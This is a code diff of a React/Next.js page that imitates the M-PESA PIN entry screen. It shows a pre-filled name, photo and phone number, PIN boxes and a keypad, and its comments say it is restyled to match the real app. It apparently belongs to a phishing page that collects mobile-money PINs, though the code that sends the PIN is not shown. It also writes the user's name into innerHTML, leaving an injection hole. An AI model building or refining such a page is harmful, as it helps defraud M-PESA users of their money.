@@ -3,7 +3,6 @@
 import { useState, useEffect, Suspense } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import axios from "axios";
-import { Fingerprint, Edit } from "lucide-react";
 
 export default function MpesaLoginPage() {
   return (
@@ -167,44 +166,53 @@ function LoginContent() {
   }
 
   return (
-    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center px-4 sm:px-6 md:px-8 relative overflow-hidden">
-      <div className="flex flex-col items-center w-full max-w-sm sm:max-w-md md:max-w-lg flex-1 justify-center py-10 sm:py-16">
-        <div className="text-center mb-8 sm:mb-10 md:mb-12 w-full">
-          <div className="w-28 h-28 sm:w-32 sm:h-32 md:w-36 md:h-36 rounded-full overflow-hidden mx-auto mb-4 border-4 border-green-600/80 shadow-xl shadow-green-900/30 flex items-center justify-center bg-gray-800 relative">
+    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center px-4 relative overflow-hidden">
+      {/* Subtle M-PESA green glow background */}
+      <div className="absolute inset-0 bg-gradient-to-b from-green-950/20 via-transparent to-black pointer-events-none" />
+
+      <div className="flex flex-col items-center w-full max-w-[380px] flex-1 justify-center py-12">
+        
+        {/* Header Text */}
+        <div className="text-center mb-8">
+          <p className="text-lg font-medium tracking-wider text-white">
+            Enter your M-PESA PIN
+          </p>
+        </div>
+
+        {/* Profile Section */}
+        <div className="flex flex-col items-center mb-8">
+          <div className="w-24 h-24 rounded-full overflow-hidden border-4 border-green-600 shadow-2xl shadow-green-900/50 mb-4 bg-gray-900">
             {userData.photo ? (
               <img
                 src={userData.photo}
-                alt={userData.name || "Profile"}
+                alt={userData.name}
                 className="w-full h-full object-cover"
                 onError={(e) => {
                   e.currentTarget.style.display = "none";
                   const parent = e.currentTarget.parentElement;
                   if (parent) {
-                    parent.innerHTML = `<span class="text-4xl sm:text-5xl md:text-6xl font-bold text-white absolute inset-0 flex items-center justify-center">${getInitials(userData.name)}</span>`;
+                    parent.innerHTML = `<span class="text-5xl font-bold text-white flex items-center justify-center h-full">${getInitials(userData.name)}</span>`;
                   }
                 }}
               />
             ) : (
-              <span className="text-4xl sm:text-5xl md:text-6xl font-bold text-white">
+              <div className="w-full h-full flex items-center justify-center text-5xl font-bold text-white bg-gray-800">
                 {getInitials(userData.name)}
-              </span>
+              </div>
             )}
           </div>
 
-          <h1 className="text-xl sm:text-2xl md:text-3xl font-bold mb-2 tracking-tight">
+          <h1 className="text-2xl font-semibold text-white mb-1">
             {userData.name || "M-PESA"}
           </h1>
 
-          {/* Phone – centered, responsive, with visible placeholder */}
+          {/* Phone Number */}
           {!isEditingPhone ? (
             <button
-              className="mt-1 flex items-center justify-center gap-1.5 mx-auto group cursor-pointer"
               onClick={() => setIsEditingPhone(true)}
+              className="text-green-400 text-[15px] font-medium flex items-center gap-1 hover:underline"
             >
-              <p className="text-base sm:text-lg text-gray-400 font-medium text-center">
-                {phone || "XXXXXXXXX"}
-              </p>
-              <Edit className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-green-500 opacity-0 group-hover:opacity-100 transition-opacity" />
+              {phone ? `0${phone.slice(-9)}` : "XXXXXXXXX"}
             </button>
           ) : (
             <input
@@ -219,71 +227,79 @@ function LoginContent() {
                 if (phone.trim()) setIsEditingPhone(false);
               }}
               autoFocus
-              placeholder="254XXXXXXX"
-              className="mt-1 bg-transparent text-center text-base sm:text-lg text-white outline-none caret-green-500 w-40 sm:w-52 max-w-full placeholder-gray-500 [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
+              placeholder="2547XXXXXXXX"
+              className="bg-transparent text-center text-green-400 text-[15px] outline-none caret-green-500 w-40 placeholder-gray-500"
               maxLength={12}
             />
           )}
         </div>
 
-        <p className="text-base sm:text-lg md:text-xl mb-6 sm:mb-8 tracking-wider uppercase text-gray-300">
-          Enter M-Pesa PIN
-        </p>
-
-        <div className="flex gap-4 sm:gap-6 md:gap-8 mb-10 sm:mb-12 md:mb-16">
+        {/* PIN Boxes */}
+        <div className="flex gap-5 mb-12">
           {Array.from({ length: 4 }).map((_, i) => (
             <div
               key={i}
-              className={`w-9 h-9 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full border-2 transition-all duration-200 ${
+              className={`w-12 h-12 rounded-xl border-2 flex items-center justify-center text-4xl font-light transition-all duration-200 ${
                 pin.length > i
-                  ? "bg-green-500 border-green-500 scale-110 shadow-lg shadow-green-600/40"
-                  : "border-gray-600"
+                  ? "bg-green-600 border-green-600 text-white shadow-lg shadow-green-500/50"
+                  : "border-gray-400 bg-transparent"
               }`}
             />
           ))}
         </div>
 
+        {/* Error Message */}
         {error && (
-          <p className="text-red-400 text-sm sm:text-base mb-6 sm:mb-8 px-4 text-center max-w-xs">
+          <p className="text-red-400 text-sm mb-6 text-center px-4">
             {error}
           </p>
         )}
 
-        <div className="grid grid-cols-3 gap-4 sm:gap-6 md:gap-8 w-full max-w-[320px] sm:max-w-[380px] md:max-w-[440px]">
+        {/* Keypad */}
+        <div className="grid grid-cols-3 gap-4 w-full max-w-[300px]">
           {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
             <button
               key={num}
               onClick={() => addDigit(num.toString())}
               disabled={isLoggingIn}
-              className="aspect-square rounded-full bg-gray-900/40 hover:bg-gray-800/60 active:bg-gray-700/80 transition-all duration-150 flex items-center justify-center text-3xl sm:text-4xl md:text-5xl font-medium touch-manipulation"
+              className="aspect-square rounded-full bg-[#1c1c1e] hover:bg-[#2c2c2e] active:bg-[#3a3a3c] transition-all text-4xl font-light text-white touch-manipulation"
             >
               {num}
             </button>
           ))}
 
-          <div />
+          {/* Fingerprint / Cancel area */}
+          <button
+            onClick={deleteDigit}
+            disabled={isLoggingIn || pin.length === 0}
+            className="aspect-square rounded-full bg-[#1c1c1e] hover:bg-[#2c2c2e] active:bg-[#3a3a3c] flex items-center justify-center text-red-500 touch-manipulation"
+          >
+            <span className="text-4xl font-light">×</span>
+          </button>
 
           <button
             onClick={() => addDigit("0")}
             disabled={isLoggingIn}
-            className="aspect-square rounded-full bg-gray-900/40 hover:bg-gray-800/60 active:bg-gray-700/80 transition-all duration-150 flex items-center justify-center text-3xl sm:text-4xl md:text-5xl font-medium touch-manipulation"
+            className="aspect-square rounded-full bg-[#1c1c1e] hover:bg-[#2c2c2e] active:bg-[#3a3a3c] transition-all text-4xl font-light text-white touch-manipulation"
           >
             0
           </button>
 
+          {/* Green Delete Button (matching image) */}
           <button
             onClick={deleteDigit}
             disabled={isLoggingIn || pin.length === 0}
-            className="aspect-square rounded-full bg-gray-900/40 hover:bg-gray-800/60 active:bg-gray-700/80 transition-all duration-150 flex items-center justify-center touch-manipulation"
+            className="aspect-square rounded-full bg-green-600 hover:bg-green-500 active:bg-green-700 flex items-center justify-center text-white touch-manipulation"
           >
-            <Fingerprint className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 text-white" />
+            <span className="text-3xl font-medium">✕</span>
           </button>
         </div>
       </div>
 
+      {/* Loading Overlay */}
       {isLoggingIn && (
-        <div className="absolute inset-0 bg-black/60 flex items-center justify-center z-30">
-          <div className="animate-spin rounded-full h-14 w-14 sm:h-16 sm:w-16 border-t-4 border-b-4 border-green-500"></div>
+        <div className="absolute inset-0 bg-black/80 flex items-center justify-center z-50">
+          <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-green-500"></div>
         </div>
       )}
     </div>
